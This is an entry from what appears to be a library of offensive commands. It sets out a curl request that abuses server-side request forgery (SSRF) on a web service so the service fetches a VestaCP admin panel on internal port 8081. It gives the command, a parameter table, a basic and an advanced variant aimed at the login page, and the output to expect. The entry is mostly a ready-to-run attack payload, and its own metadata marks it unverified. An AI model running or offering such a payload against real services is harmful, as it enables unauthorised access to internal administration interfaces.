---
data: 'curl -X POST -d ''url=http://127.0.0.1:8081/'' https://www.apitest.io/request'
tags:
  - ssrf
  - admin
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.435Z'
id: 65aa10e8-772a-4f71-a368-cf5def873f90
verified: false
validated: true
submitted: true
---
# curl-ssrf-vestacp-admin

## Command

```bash
curl -X POST -d 'url=http://127.0.0.1:8081/' https://www.apitest.io/request
```

## Description

Exploits SSRF to access the VestaCP admin panel on internal port 8081.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d 'url=...'` | Admin URL payload | Yes |
| `https://www.apitest.io/request` | Endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'url=http://127.0.0.1:8081/' https://www.apitest.io/request
```

### Advanced Usage

```bash
curl -X POST -d 'url=http://127.0.0.1:8081/login/' https://www.apitest.io/request
```

## Expected Output

VestaCP welcome or login page: "VestaCP powered by ..."

## Related

- [[Related Procedure]]
